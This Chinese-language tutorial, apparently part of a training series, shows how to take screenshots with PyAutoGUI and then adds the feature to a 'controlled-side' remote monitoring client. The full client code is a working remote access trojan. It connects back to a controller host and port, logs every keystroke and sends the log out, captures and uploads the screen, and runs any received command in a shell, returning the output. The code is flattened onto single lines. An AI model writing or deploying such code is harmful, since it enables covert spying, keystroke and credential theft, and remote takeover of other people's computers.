## **pyautogui**

**  

  

在python中对屏幕截图有很多种方法，今天训练营使用的是PyAutoGUI库下的screenshot方法，来进行屏幕的截取

PyAutoGUI是一个简单易用，跨平台的可以模拟键盘鼠标进行自动操作的python库。

  

**2****本地的截屏  
**  

  

```

```

*   
*   
*   
*   
*   

```
import pyautogui
img = pyautogui.screenshot()
img.save("test.jpg")
```

  

screenshot方法的参数如果不填写那么就默认截取整个屏幕的画面，如果对截取区域有要求可以这么写

img = pyautogui.screenshot(`region=(0, 0, w ,h)`)

w为宽，h为高  

  

**3****远程监视：被控端**  

  

客户端的改动较上期相对大一些所以我们先修改客户端。

新加take\_photo的方法，用来截取屏幕利用io流来完成图片到二进制的转换，以及进一步转换为base64的格式来进行发送。

```
def take_photo(sock):    img = pyautogui.screenshot()    img_bytes = io.BytesIO()    img.save(img_bytes, format="PNG")    image_bytes = img_bytes.getvalue()    base64_data = base64.b64encode(image_bytes).decode("ascii")    sock.send("photo:".encode("UTF-8"))    sock.send(base64_data.encode("UTF-8"))
```

```
HOST = ''  # 控制端IPPORT = 53132  # 控制端端口sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 建立socksock.connect((HOST, PORT))time.sleep(2)key_log = '键盘监听内容：'
def on_press(key):    pass
def on_release(key):    global key_log    target = str(key).replace("'", "")    key_log = key_log + target
def linsten():    with Listener(on_release=on_release, on_press=on_press) as Listeners:        Listeners.join()
def fa_key(sock):    global key_log    time.sleep(8)    sock.send(key_log.encode("UTF-8"))    key_log = '键盘监听内容：'
def take_photo(sock):    img = pyautogui.screenshot()    img_bytes = io.BytesIO()    img.save(img_bytes, format="PNG")    image_bytes = img_bytes.getvalue()    base64_data = base64.b64encode(image_bytes).decode("ascii")    sock.send("photo:".encode("UTF-8"))    sock.send(base64_data.encode("UTF-8"))
listen = threading.Thread(target=linsten)listen.start()listen2 = threading.Thread(target=fa_key, args=(sock,))listen2.start()while True:    try:        buf = sock.recv(1024)        cmd = buf.decode("utf-8")        if cmd == "sct":            take_photo(sock)        else:            answer = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,                                      stderr=subprocess.PIPE)            res = answer.stdout.read()            print(res)            res = str(res)            if res == "":                sock.send("OK".encode("UTF-8"))            sock.send(res.encode("UTF-8"))    except socket.timeout:        sock.close()
```
